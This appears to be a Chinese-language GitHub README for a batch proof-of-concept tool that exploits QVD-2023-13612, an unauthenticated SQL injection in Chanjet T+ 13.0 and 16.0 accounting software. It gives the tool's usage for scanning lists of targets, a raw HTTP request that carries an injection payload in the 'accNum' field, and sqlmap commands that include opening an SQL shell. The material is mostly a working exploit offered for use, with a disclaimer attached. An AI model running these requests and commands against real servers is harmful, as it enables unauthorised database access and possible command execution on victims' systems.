

## QVD-2023-13612 用友畅捷通T SQL注入 批量POC！

畅捷通T+SQL注入漏洞，未经身份认证的远程攻击者可在易受攻击系统上执行任意SQL语句，某些情况下攻击者利用该漏洞可在底层操作系统上执行shell命令。

### 影响范围

  畅捷通T+ 13.0

  畅捷通T+ 16.0

### Usage

```
usage: QVD-2023-13612_TPlus-SQLvuln.py [-h] [-u URL] [-f FILE] [-t THREAD] [-T TIMEOUT] [-o OUTPUT] [-p PROXY]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target url(e.g. http://127.0.0.1)
  -f FILE, --file FILE  Target file(e.g. url.txt)
  -t THREAD, --thread THREAD
                        Number of thread (default 5)
  -T TIMEOUT, --timeout TIMEOUT
                        Request timeout (default 3)
  -o OUTPUT, --output OUTPUT
                        Vuln url output file (e.g. result.txt)
  -p PROXY, --proxy PROXY
                        Request Proxy (e.g http://127.0.0.1:8080)
```

POC

```
 python '.\QVD-2023-13612_SQL Injection Vulnerability.py' -u http://host
```

![image-20230628001513660](https://github.com/Sweelg/QVD-2023-13612_TPlus-SQLvuln/raw/main/img/4.png)

```
 python '.\QVD-2023-13612_SQL Injection Vulnerability.py' -f .\url.txt -t 5 -o 1.txt
```

![image-20230628003352114](D:\tools\GitHub-exp\QVD-2023-13612 用友畅捷通T SQL注入\img\5.png)

### 数据包

```
POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/css,*/*;q=0.1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 79

{"accNum": "3'and (select @@version)>0--", "functionTag": "SYS0104", "url": ""}
```

![](D:\tools\GitHub-exp\QVD-2023-13612 用友畅捷通T SQL注入\img\1.png)

### EXP

```
python sqlmap.py -r sql.txt --random-agent -v 3 --dbms mssql --hex -p "accNum" --batch
python sqlmap.py -r sql.txt --random-agent -v 3 --dbms mssql --hex -p "accNum" --batch --sql-shell
```

sql.txt数据包

```
POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/css,*/*;q=0.1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 53

{"accNum": "3'", "functionTag": "SYS0104", "url": ""}
```

![image-20230627173340255](D:\tools\GitHub-exp\QVD-2023-13612 用友畅捷通T SQL注入\img\2.png)

![image-20230627225735364](D:\tools\GitHub-exp\QVD-2023-13612 用友畅捷通T SQL注入\img\3.png)

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，**均由使用者本人负责，作者不为此承担任何责任**。

















